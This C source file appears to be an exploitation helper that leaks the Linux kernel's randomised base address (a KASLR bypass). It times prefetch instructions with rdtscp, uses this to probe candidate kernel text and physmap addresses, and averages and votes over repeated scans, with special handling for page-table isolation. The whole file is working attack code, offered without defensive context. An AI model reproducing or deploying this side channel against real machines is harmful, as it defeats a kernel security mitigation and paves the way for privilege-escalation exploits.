#include "kaslr.h"

uint64_t sidechannel(size_t addr) {
  uint64_t a, b, c, d;
  asm volatile (".intel_syntax noprefix;"
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "mfence;"
    "prefetcht0 qword ptr [%4];"
    "prefetcht0 qword ptr [%4];"
    "mfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    ".att_syntax;"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

void clean_cache(size_t base){
    for(int i=0;i<0x100;i++){
        // Access Order
        // int mess = (i*167+13)%0x200; // Makes no diff
        size_t mess = i;
        size_t probe = (mess*0x1000+base);
        // prefecth access
        sidechannel(probe);
    }
}


u64 leak_syscall_entry(int pti) 
{
    sched_yield();
    u64 data[ARR_SIZE] = {0};
    u64 min = ~0, addr = ~0;
    for (int i = 0; i < ITERATIONS + 2; i++)
    {
        for (u64 idx = 0; idx < ARR_SIZE; idx++) 
        {
            // syscall(0x68);
            // sched_yield();
            syscall(0x144,0x132,0x132); // Makes no diff but a little faster
            u64 time = sidechannel(SCAN_START + idx * STEP);
            // clean_cache((size_t)trash);
             if (i >= 2)
                data[idx] += time;
        }
    }
    for (int i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + i * STEP;
        }
    }
    if(pti){
        u64 previous_data = data[0];
        // More analysis for pti
        for(int i = 0x1; i< ARR_SIZE; i++)
        {
            if(data[i]>previous_data*1.1) // outliner
                continue;
            // Find the `dent`
            if( data[i]< previous_data && previous_data-data[i] > 0.15*previous_data && data[i]<min*1.05)
            {
                addr = SCAN_START + i * STEP;
                break;
            }
            previous_data = data[i];
        }
    }
    return addr;
}
size_t get_kaslr(int pti){
    return leak_syscall_entry(pti);
}
u64 _leak_phys(size_t pti) 
{
    // When pti = on, make sure pcid is on for /proc/cpu
    if(pti==1){
        
        panic("You may provide an offset of the kernel page on user space, e.g., 0x11c132000");
        exit(1);
    }
    sched_yield();

    u64 data[ARR_SIZE_PHYS] = {0};
    u64 min = ~0, addr = ~0;
    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (u64 idx = 0; idx < ARR_SIZE_PHYS; idx++) 
        {

            u64 probe = SCAN_START_PHYS + idx * STEP_PHYS + pti;
            syscall(0x144,0x132,0x132); // Makes no diff but a little faster
            u64 time = sidechannel(probe);
            
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }
    // We start at 0x40 since we warmed up 0x40 times before it

        for (int i = 0x40; i < ARR_SIZE_PHYS; i++)
        {
            data[i] /= ITERATIONS;
            if (data[i] < min)
            {
                min = data[i];
                addr = SCAN_START_PHYS + i * STEP_PHYS ;
            }
        }
        int previous_data = data[0x40];
        // More analysis for pti
        for(int i = 0x41; i< ARR_SIZE_PHYS; i++)
        {
            if(data[i]>previous_data*1.1)
                continue;
    
            if( data[i]< previous_data && \
                (double)previous_data*0.9375 > (double)data[i] && \
                data[i] < min*1.0625 )
            {
                addr = SCAN_START_PHYS + i * STEP_PHYS ;
                break;
            }
            previous_data = data[i];
        }
    
    return addr;
}
size_t _find_duplicate(size_t a, size_t b, size_t c) {
    if (a == b || a == c)
        return a;
    if (b == c)
        return b;
    return 0; // all different
}
size_t get_kaslr_precise(int pti){
    size_t val[3];
    for(int i = 0; i < 3 ; i++)
        val[i] = get_kaslr(pti);
    size_t res = _find_duplicate(val[0],val[1],val[2]);
    if(res)
        return res;
    else
        return get_kaslr_precise(pti);
    
}
size_t get_physmap(size_t pti){
    return _leak_phys(pti);
}
size_t get_physmap_precise(size_t pti){
    size_t val[3];
    for(int i = 0; i < 3 ; i++)
        val[i] = _leak_phys(pti);
    size_t res = _find_duplicate(val[0],val[1],val[2]);
    if(res)
        return res;
    else
        return get_physmap_precise(pti);
}